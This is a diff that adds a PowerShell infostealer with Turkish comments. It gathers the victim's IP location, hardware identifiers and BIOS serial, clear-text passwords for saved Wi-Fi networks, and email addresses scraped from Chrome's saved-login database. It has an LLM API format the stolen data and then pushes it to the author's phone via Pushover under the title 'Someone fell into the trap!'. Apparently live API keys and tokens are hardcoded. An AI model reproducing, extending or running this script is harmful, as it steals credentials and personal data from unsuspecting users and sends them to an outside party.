@@ -1,0 +1,183 @@
+
+$ErrorActionPreference = 'Stop'
+# Konsol işleyicisinin varlığı kontrol edilir
+if ([Console]::OutputEncoding -ne $null) {
+    try {
+        [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+    } catch {
+        # Çıktı yönlendirmesi yapılan durumlarda hatayı yutması sağlanır
+    }
+}
+
+# PowerShell oturum içi varsayılan çıktı kodlaması
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
+# API Yapılandırması
+$apiKey   = "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"
+$model    = "meta-llama/llama-3.3-70b-instruct"
+
+# Pushover Yapılandırması
+$userKey  = "uuy59kz55tufcw1qfntmvo2z3sdwte"
+$apiToken = "a4qfowcymqhycjjpfj2p3sww1fbh9k"
+
+# --- 1. VERİ TOPLAMA ---
+try { $ip = Invoke-RestMethod 'https://api.ipify.org?format=json' } catch { $ip = @{ip='Bilinmiyor'} }
+try { $info = Invoke-RestMethod ("https://ipinfo.io/" + $ip.ip + "/json") } catch { $info = @{} }
+
+$cs  = Get-CimInstance Win32_ComputerSystem
+$os  = Get-CimInstance Win32_OperatingSystem
+$cpu = Get-CimInstance Win32_Processor
+$mac = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -First 1).MACAddress
+
+$cv   = @("$env:PROGRAMFILES\Google\Chrome\Application\chrome.exe", "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
+$cver = if ($cv) { (Get-Item $cv).VersionInfo.ProductVersion } else { 'yok' }
+
+# --- SISTEM & AG METNI ---
+$sysList = [System.Collections.Generic.List[string]]::new()
+$sysList.Add("===== KONUM / AG =====")
+$sysList.Add("IP         : " + $ip.ip)
+$sysList.Add("Ulke       : " + $info.country)
+$sysList.Add("Bolge      : " + $info.region)
+$sysList.Add("Sehir      : " + $info.city)
+$sysList.Add("ISP        : " + $info.org)
+$sysList.Add("VPN        : " + $info.usingVPN)
+$sysList.Add("===== CIHAZ =====")
+$sysList.Add("Bilgisayar : " + $env:COMPUTERNAME)
+$sysList.Add("Kullanici  : " + $env:USERNAME)
+$sysList.Add("Oturum     : " + $cs.UserName)
+$sysList.Add("Uretici    : " + $cs.Manufacturer)
+$sysList.Add("Model      : " + $cs.Model)
+$sysList.Add("Seri No    : " + (Get-CimInstance Win32_BIOS).SerialNumber)
+$sysList.Add("Anakart    : " + (Get-CimInstance Win32_BaseBoard).Product)
+$sysList.Add("OS         : " + $os.Caption + " (Build " + $os.BuildNumber + ")")
+$sysList.Add("CPU        : " + $cpu.Name)
+$sysList.Add("RAM        : " + [math]::Round($cs.TotalPhysicalMemory/1GB,2) + " GB")
+$sysList.Add("MAC        : " + $mac)
+$sysList.Add("===== CHROME =====")
+$sysList.Add("Versiyon   : " + $cver)
+
+# --- WIFI METNI ---
+$wifiList = [System.Collections.Generic.List[string]]::new()
+$wifiList.Add("===== WIFI =====")
+(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object {
+    $p = ($_ -split ':')[1].Trim()
+    $d = netsh wlan show profile name=$p key=clear
+    $pw = ($d | Select-String 'Key Content' | ForEach-Object { ($_ -split ':')[1].Trim() })
+    if (-not $pw) { $pw = '(sifre yok)' }
+    $wifiList.Add("SSID  : " + $p)
+    $wifiList.Add("Sifre : " + $pw)
+}
+
+# --- MAIL METNI ---
+$ld = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+$hamMailList = [System.Collections.Generic.List[string]]::new()
+if (Test-Path $ld) {
+    $tmp = "$env:TEMP\l.db"
+    Copy-Item $ld $tmp -Force
+    $bytes = [System.IO.File]::ReadAllBytes($tmp)
+    $str = [System.Text.Encoding]::UTF8.GetString($bytes)
+    $matches = [regex]::Matches($str, '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
+    $uniqueMails = $matches | Select-Object -ExpandProperty Value -Unique | Select-Object -First 30
+    foreach ($m in $uniqueMails) { [void]$hamMailList.Add($m) }
+    Remove-Item $tmp -Force
+}
+
+$sysText  = $sysList -join [Environment]::NewLine
+$wifiText = $wifiList -join [Environment]::NewLine
+$mailText = $hamMailList -join [Environment]::NewLine
+
+# --- PROMPT METNİ ---
+$prompt = @"
+Aşağıdaki verileri işle ve ÇIKTI ÖRNEĞİ yapısına birebir uyarak birleştir.
+
+GÖREVLER:
+1. 'HAM MAILLER' kısmındaki e-postaları temizle (login, username vb. çöp ekleri kaldır). Temizlenen her mailin başına 'Mail : ' ekle.
+2. Sistem bilgileri, temizlenmiş e-postalar ve Wi-Fi bilgilerini verilen sıralama ve başlık düzeninde birleştir.
+3. Yanıtında hiçbir yorum, ek açıklama veya selamlaşma cümlesi yazma. Sadece şablondaki veriyi çıktı ver.
+4. Türkçe karakterler olmayacak. Örneğin, Ğ,ğ G,g ye dönüşecek İ,I Ş,ş S,s vb. olacak.
+
+HAM MAILLER:
+$mailText
+
+SİSTEM BİLGİLERİ:
+$sysText
+
+WIFI BİLGİLERİ:
+$wifiText
+
+ÇIKTI ÖRNEĞİ:
+===== KONUM / AG =====
+IP         : ...
+Ulke       : ...
+Bolge      : ...
+Sehir      : ...
+ISP        : ...
+VPN        : ...
+===== CIHAZ =====
+Bilgisayar : ...
+Kullanici  : ...
+Oturum     : ...
+Uretici    : ...
+Model      : ...
+Seri No    : ...
+Anakart    : ...
+OS         : ...
+CPU        : ...
+RAM        : ...
+MAC        : ...
+===== CHROME =====
+Versiyon   : ...
+--- MAILLER ---
+Mail : email@domain.com
+===== WIFI =====
+SSID  : ...
+Sifre : ...
+"@
+
+# --- API İSTEĞİ ---
+$headers = @{
+    "Authorization" = "Bearer $apiKey"
+    "Content-Type"  = "application/json"
+}
+
+$body = @{
+    model = $model
+    messages = @(
+        @{
+            role    = "user"
+            content = $prompt
+        }
+    )
+} | ConvertTo-Json -Depth 10
+
+try {
+    # 1. OpenRouter API Çağrısı
+    $response = Invoke-RestMethod `
+        -Uri "https://openrouter.ai/api/v1/chat/completions" `
+        -Method POST `
+        -Headers $headers `
+        -Body ([System.Text.Encoding]::UTF8.GetBytes($body))
+
+    $finalOutput = $response.choices[0].message.content
+
+    # 2. Ekrana Yazdır
+    Write-Host $finalOutput
+
+    # 3. Pushover API ile Telefona Bildirim Gönder
+    $pushoverBody = @{
+        token   = $apiToken
+        user    = $userKey
+        message = $finalOutput
+        title   = "Tuzağa Biri Düştü!"
+    }
+
+    Invoke-RestMethod `
+        -Uri "https://api.pushover.net/1/messages.json" `
+        -Method POST `
+        -Body $pushoverBody
+
+    Write-Host "`n[+] Veri Pushover aracılığıyla telefona başarıyla gönderildi." -ForegroundColor Green
+
+} catch {
+    Write-Host "[!] Hata oluştu: $_" -ForegroundColor Red
+}
